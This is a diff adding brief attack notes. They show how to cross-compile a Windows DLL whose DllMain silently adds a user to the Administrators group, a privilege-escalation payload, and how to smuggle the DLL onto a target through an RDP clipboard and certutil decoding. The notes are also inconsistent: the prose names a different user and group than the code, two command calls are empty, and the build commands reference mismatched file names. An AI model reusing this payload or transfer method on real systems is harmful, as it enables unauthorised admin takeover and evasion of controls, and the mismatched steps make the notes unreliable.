@@ -1,0 +1,38 @@
+#Building a DLL in Linux
+The code below shows how to add an already-registered regular user into administrators group. The hack.c file in lin OpsStation creates a user named student and adds them to the administrators and RemoteDesktop Users groups.
+
+
+
+apt-get install mingw-w64 mingw-w64-common mingw-w64-i686-dev mingw-w64-tools mingw-w64-tools mingw-w64-x86-64-dev -y
+
+i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL hack.c
+
+i686-w64-mingw32-g++ -shared -o simple.dll simple.o  -Wl,--out-implib,simple.a
+
+
+
+#include <windows.h> 
+int execCommand() 
+{  
+ WinExec("cmd.exe /c net localgroup Administrators Lroth /add", 1);
+ WinExec("", 1);
+ WinExec("", 1);  
+ return 0; } 
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved) 
+{
+ execCommand();  
+ return 0;
+ }
+
+
+
+
+#Transferring a DLL to Windows from Linux without SSH,FTP,SFTP,or Python
+1. Run base64 [dll.name] > base64_dll
+2. Run md5sum base64_dll to create a MD5 hash of the dll. This will be used to validate the decoded .dll on Windows.
+3. Open base64_dll in gedit and Ctrl+A and Ctrl+C the document to copy the code
+4. Open an xfreerdp session to Windows using +clipboard
+5. Copy the text into a text file on Windows.
+6. Remove the .txt file extension using the move command on the commandline.
+7. Run certutil -decode to decode the file that was copied
+8. Run certutil -hashfile to check the hash of the .dll compared to what it was on Linux prior to copying it.
